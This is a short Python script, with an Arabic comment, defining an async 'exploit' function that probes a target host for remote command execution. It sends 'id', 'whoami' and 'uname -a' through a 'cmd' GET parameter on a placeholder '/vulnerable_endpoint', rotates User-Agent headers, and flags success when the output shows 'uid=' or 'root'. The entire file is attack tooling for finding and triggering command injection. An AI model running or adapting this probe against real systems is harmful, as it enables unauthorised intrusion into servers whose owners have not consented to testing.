import aiohttp
import asyncio

async def exploit(target, port, user_agents):
    # مثال بسيط - يعتمد على ثغرة تنفيذ أوامر عبر GET param اسمها cmd
    payloads = ["id", "whoami", "uname -a"]
    headers_template = {"User-Agent": ""}
    async with aiohttp.ClientSession() as session:
        for cmd in payloads:
            url = f"http://{target}:{port}/vulnerable_endpoint?cmd={cmd}"
            for agent in user_agents:
                headers_template["User-Agent"] = agent
                try:
                    async with session.get(url, headers=headers_template, timeout=10) as resp:
                        text = await resp.text()
                        if "uid=" in text or "root" in text:
                            return f"RCE vulnerability found: {url} with command {cmd}"
                except Exception:
                    continue
    return None
